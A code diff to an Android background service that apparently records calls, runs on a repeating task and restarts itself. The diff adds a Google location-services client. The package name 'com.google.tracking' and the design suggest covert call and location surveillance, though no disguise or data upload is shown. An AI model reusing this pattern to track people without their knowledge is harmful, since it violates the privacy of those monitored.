@@ -9,9 +9,12 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationServices;
 import com.google.tracking.call.CallRecorderController;
 import com.google.tracking.constants.TrackingConstants;
 import com.google.tracking.runnable.RepeatingTask;
+import google_api.ApiConnectionListener;
 
 
 public class TService extends Service {
@@ -59,10 +62,26 @@ public class TService extends Service {
 
         new RepeatingTask(TrackingConstants.RUN_REPEATING_TASK_INTERVAL);
 
+        createGoolApiClient();
+
         // if(terminate != null) {
         // stopSelf();
         // }
         return START_STICKY;
+    }
+
+    private GoogleApiClient mGoogleApiClient;
+    private void createGoolApiClient() {
+        // Create an instance of GoogleAPIClient.
+        ApiConnectionListener l = new ApiConnectionListener();
+        if (mGoogleApiClient == null) {
+            mGoogleApiClient = new GoogleApiClient.Builder(this)
+                    .addConnectionCallbacks(l)
+                    .addOnConnectionFailedListener(l)
+                    .addApi(LocationServices.API)
+                    .build();
+        }
+        mGoogleApiClient.connect();
     }
 
     public class CallReceiver extends BroadcastReceiver {
@@ -131,7 +150,5 @@ public class TService extends Service {
             }
         }
 
-
     }
-
 }
